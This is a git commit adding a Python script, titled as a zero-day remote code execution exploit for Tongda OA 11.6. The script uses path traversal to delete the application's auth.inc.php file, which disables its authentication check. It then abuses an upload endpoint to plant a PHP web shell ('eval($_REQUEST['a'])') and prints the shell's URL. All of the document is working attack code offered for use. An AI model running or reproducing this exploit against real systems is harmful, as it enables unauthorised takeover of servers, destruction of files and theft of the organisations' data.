fefd33f44420ad4c82722b7a7bf229f9ed84b239
TomAPU <44659204+TomAPU@users.noreply.github.com>
2020-08-17 23:45:16 +0800

    通达OA11.6 RCE 0day

---
+++ rce.py
@@ -0,0 +1,26 @@
+import requests
+#target="http://127.0.0.1:8203/"
+payload="<?php eval($_REQUEST['a']);?>"
+
+print("[*]Deleting auth.inc.php....")
+
+url=target+"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"
+requests.get(url=url)
+print("[*]Checking if file deleted...")
+url=target+"/inc/auth.inc.php"
+page=requests.get(url=url).text
+if 'No input file specified.' not in page:
+    print("[-]Failed to deleted auth.inc.php")
+    exit(-1)
+print("[+]Successfully deleted auth.inc.php!")
+print("[*]Uploading payload...")
+url=target+"/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.<>./.<>./.<>./"
+files = {'FILE1': ('hack.php', payload)}
+requests.post(url=url,files=files)
+url=target+"/_hack.php"
+page=requests.get(url=url).text
+if 'No input file specified.' not in page:
+    print("[+]Filed Uploaded Successfully")
+    print("[+]URL:",url)
+else:
+    print("[-]Failed to upload file")
